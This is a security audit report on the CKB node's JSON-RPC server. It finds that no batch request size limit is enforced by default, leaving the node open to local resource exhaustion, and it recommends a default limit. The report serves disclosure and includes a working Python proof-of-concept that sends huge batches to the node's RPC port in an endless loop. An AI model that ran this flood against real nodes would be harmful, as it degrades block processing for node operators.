Audit Report

## Title
No Default Enforcement of JSON-RPC Batch Request Size Limit Enables Local Resource Exhaustion - (File: `rpc/src/server.rs`)

## Summary
`rpc_batch_limit` is `Option<usize>` with no default value and is only populated in the global `JSONRPC_BATCH_LIMIT` static when an operator explicitly sets it. The batch-size guard in `handle_jsonrpc` is gated on that static being populated, so by default any caller can submit an arbitrarily large batch request bounded only by the 10 MiB body limit. A 30-second `TimeoutLayer` provides partial mitigation but does not prevent repeated flooding.

## Finding Description
`rpc_batch_limit` carries no default and is declared as a bare `Option<usize>`: [1](#0-0) 

At startup, `JSONRPC_BATCH_LIMIT` is only initialized when the operator has explicitly set the option: [2](#0-1) 

The batch guard in `handle_jsonrpc` is conditional on the static being set; when it is `None` (the default), all calls in the batch proceed unconditionally: [3](#0-2) 

The shipped default configuration explicitly leaves the limit commented out: [4](#0-3) 

One partial mitigation exists that the report does not address: a `TimeoutLayer` of 30 seconds is applied to the HTTP server: [5](#0-4) 

This caps any single batch request to 30 seconds of processing before the connection is terminated. However, it does not prevent an attacker from repeatedly submitting maximally-sized batch requests in a loop, sustaining CPU and memory pressure indefinitely.

## Impact Explanation
The RPC endpoint binds to `127.0.0.1:8114` by default, restricting the attack surface to local callers. Any local process — scripts, co-located services, or a compromised application — can submit repeated large batch requests, pegging CPU and degrading or halting block processing, transaction relay, and peer synchronization. This maps to the **Note (0–500 points): Any local RPC API crash** impact tier for the default configuration. If the operator has exposed the RPC port to the network (explicitly warned against in documentation), the impact escalates to **High (10001–15000 points): Vulnerabilities which could easily crash a CKB node**, reachable by any unauthenticated network client.

## Likelihood Explanation
No authentication is required. For the default localhost binding, any local process qualifies as an attacker. The attack requires a single HTTP POST and is trivially repeatable. The 30-second timeout limits per-request damage but does not prevent sustained flooding. Exposure of the RPC port to the network is common in practice despite documentation warnings, which elevates real-world likelihood.

## Recommendation
1. Set a safe non-`None` default for `rpc_batch_limit` in the `Config` struct (e.g., 100–500 calls) so the limit is enforced without operator action.
2. Enforce the limit unconditionally in `handle_jsonrpc` rather than only when `JSONRPC_BATCH_LIMIT` is populated.
3. Apply the same batch limit to the TCP path (`start_tcp_server`), which currently has no equivalent guard.

## Proof of Concept
```python
import json, requests, itertools

calls = [{"jsonrpc":"2.0","method":"get_tip_block_number","params":[],"id":i}
         for i in range(200_000)]
body = json.dumps(calls)
assert len(body.encode()) < 10 * 1024 * 1024  # under 10 MiB limit

# Repeat to sustain resource exhaustion; each request runs for up to 30s
for _ in itertools.count():
    requests.post("http://127.0.0.1:8114", data=body,
                  headers={"Content-Type": "application/json"}, timeout=35)
```
With `rpc_batch_limit` unset (the default), the node processes all calls in each batch until the 30-second timeout fires, then immediately accepts the next request. Node CPU remains pegged and block processing degrades for the duration.

### Citations

**File:** util/app-config/src/configs/rpc.rs (L43-44)
```rust
    /// Number of RPC batch limit.
    pub rpc_batch_limit: Option<usize>,
```

**File:** rpc/src/server.rs (L53-55)
```rust
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }
```

**File:** rpc/src/server.rs (L125-128)
```rust
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
```

**File:** rpc/src/server.rs (L274-296)
```rust
            Request::Batch(calls) => {
                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
                    && calls.len() > *batch_size
                {
                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
                        "batch size is too large, expect it less than: {}",
                        batch_size
                    )));
                }

                let stream = stream::iter(calls)
                    .then(move |call| {
                        let io = Arc::clone(&io);
                        async move { io.handle_call(call, T::default()).await }
                    })
                    .filter_map(|response| async move { response });

                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    StreamBodyAs::json_array(stream),
                )
                    .into_response()
            }
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```
